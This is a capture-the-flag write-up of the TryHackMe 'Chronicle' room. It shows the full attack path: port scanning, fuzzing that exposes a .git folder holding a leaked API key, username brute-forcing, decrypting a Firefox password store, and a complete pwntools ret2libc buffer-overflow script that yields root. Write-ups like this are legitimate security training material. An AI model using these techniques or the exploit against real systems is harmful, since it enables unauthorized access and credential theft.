---
title: Chronicle Writeup
published: true
categories: writeups
tags: TryHackMe
challenge: https://tryhackme.com/room/chronicle
---
**Challenge link** => [{{ page.challenge }}]({{ page.challenge }})

Today, I'll try a *free* challenge from **0cirius0**

**0cirius0's [twitter](https://twitter.com/0cirius0)**

---
Alright so let's get started by deploying the VM attached to the room.

`nmap result : `
```sh
┌[Gal1leoHackingStation]─[14:27-18/04]─[/home/gal1leo/TryHackMe]
└╼root$nmap -sC -sV 10.10.84.208
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-18 14:27 IST
Nmap scan report for 10.10.84.208
Host is up (0.44s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)
|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)
|_  256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Ok, cool. We've got `ssh` running on port `22` and an `apache` website on port `80`.
The website looks like a good place to start looking for clues.

![](/assets/images/2022-04-18_14-30.png)

When we visit the website, we see something that looks like *professional* web design.
My big brain decided that for some reason "OLD" was the name of a file on the server.

Going to `http://10.10.84.208/OLD` we find nothing useful

![](/assets/images/2022-04-18_14-34.png)

Going to the same url but we write "OLD" in lowercase `http://10.10.84.208/old` we find something more promising

![](/assets/images/2022-04-18_14-36.png)

Contents of note.txt: `Everything has been moved to new directory and the webapp has been deployed`

I moved into the `templates/` directory and start clicking random things hoping they do something <span style="color:red">**(Spoiler alert: they don't seem to be doing anything)**</span> Well, everything seems useless apart from the `Login` button which redirects you to `/login`.

I try going to `http://10.10.84.208/old/templates/login.html` and see something resembling a login form

![](/assets/images/2022-04-18_14-48.png)

I proceed to ~~create~~ attempt to create an account and it doesn't work. I see there's a reference to a page `/forgot.html` and decide to visit it.

![](/assets/images/2022-04-18_14-52.png)

*"Just enter your username below and we'll show you your password"*.
&nbsp;That sounds very convenient. But I don't know any users on this website. Tried `admin` and other guesses, and nothing showed up.

I start feeling like I'm digging into a rabbit hole, and decide to visit whatever is on port `8081` from the nmap output at the start.

![](/assets/images/2022-04-18_14-59.png)

You wouldn't believe it but it looks like an actual working website. Going to the `/forgot` page, we're still not receiving any output.

By inspecting the `POST` request in the Chrome `Network` tab, I realized there was some `api key` missing.

Looking around through the source code, we can see that the key was removed

![](/assets/images/2022-04-18_15-05.png)

Going back to the `/old` directory on port `80` I run a hidden directory scan to see if we ommitted anything

```sh
[Gal1leoHackingStation]─[15:14-18/04]─[/home/gal1leo/TryHackMe]
└╼root$ffuf -u http://10.10.84.208/old/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
Found the `.git` directory. Let's download it on out machine
```sh
┌[Gal1leoHackingStation]─[15:18-18/04]─[/home/gal1leo/TryHackMe]
└╼root$wget -r http://10.10.84.208:80/old/.git
```
running `git log` shows there was some commits done to this repo. Let's check them out. One of them actually leaks the api key.

![](/assets/images/2022-04-18_15-30.png)
 
 Alright, let's get to using it then. For this, I'll use `BurpSuite` so we can intercept the request; modify the api key and then forward it.

 ![](/assets/images/2022-04-18_15-37.png)
 ![](/assets/images/2022-04-18_15-39.png)

In an ideal word, everything would work out perfectly. But not in my world. The user `admin` doesn't exist on the website. Alright. I guess it's time to bruteforce a username. If you have time, you can try doing it with `Burp Suite`. I'll use `ffuf` instead.
```sh
ffuf -fw 2 -w /opt/SecLists/Usernames/Names/names.txt -X POST -d '{"key":"[REDACTED_BECAUSE_I_CAN]"}' -u http://10.10.84.208:8081/api/FUZZ
```
.. and we got a user: `tommy`

![](/assets/images/2022-04-18_15-51.png)

Thanks tommy. We won't use your account for malicious purposes. As I say this, I connect to the ssh server using the credentials we just got.

![](/assets/images/2022-04-18_15-56.png)

running `sudo -l` doesn't yield any results, so let's go exploring. There was nothing interesting to see, only **carlJ**'s home directory, which we were allowed to access. I saw .mozila in his home dir, and wanted to see if maybe we can dump some passwords from it.

I downloaded `https://github.com/unode/firefox_decrypt` on my machine, and downloaded `0ryxwn4c.default-release` from the ssh server.

![](/assets/images/2022-04-18_16-09.png)

ran 
```sh 
python3 /opt/firefox_decrypt/firefox_decrypt.py ./10.10.84.208:8000/0ryxwn4c.default-release/
```
and it asked for a Master password. Tried some basic passwords, and `password1` worked

![](/assets/images/2022-04-18_16-16.png)

Now that we got a password, let's try log in as `carlJ`. We go into the `~/mailing` folder, which we didn't have permission to access and found some sort of program and by the looks of it, we might be able to overflow it 😃.

![](/assets/images/2022-04-18_16-21.png)

Let's try a `ret2libc`

```sh
carlJ@incognito:~/mailing$ ldd smail 
	linux-vdso.so.1 (0x00007ffff7ffa000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
```

So the address of libc is `0x00007ffff79e2000`. Let's also find out where `system` is so we can call it, and we'll also need to know the location of `/bin/sh`

![](/assets/images/2022-04-18_16-31.png)

exploit.py:
```py            
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000 
system = libc_base + 0x4f550
binsh= libc_base + 0x1b3e1a

POPRDI=0x4007f3

payload = b'A' * 72
payload += p64(0x400556)
payload += p64(POPRDI)
payload += p64(binsh)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline("2")
p.clean()
p.sendline(payload)
p.interactive()

```

![](/assets/images/2022-04-18_16-37.png)

**Nothing was left unrooted**